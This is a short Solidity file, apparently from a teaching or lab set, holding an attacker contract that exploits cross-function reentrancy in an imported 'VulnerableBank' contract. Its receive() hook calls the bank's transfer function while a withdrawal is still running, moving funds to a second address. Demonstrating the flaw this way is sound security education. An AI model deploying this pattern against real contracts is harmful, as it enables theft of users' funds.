// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./CrossFunctionReentrancy.sol";

contract VulnerableBankAttack{

    address bank;
    address mockPerson;

    constructor(address _bank, address _anotherPerson){
        bank = _bank;
        mockPerson = _anotherPerson;
    }

    function deposit() external payable {
        VulnerableBank(bank).deposit{value: msg.value}();
    }

    function withdraw(uint256 amount) external payable {
        VulnerableBank(bank).withdraw(amount);
    }

    receive() external payable {
        uint256 balance = address(this).balance;
        VulnerableBank(bank).transfer(balance,mockPerson);
    }
}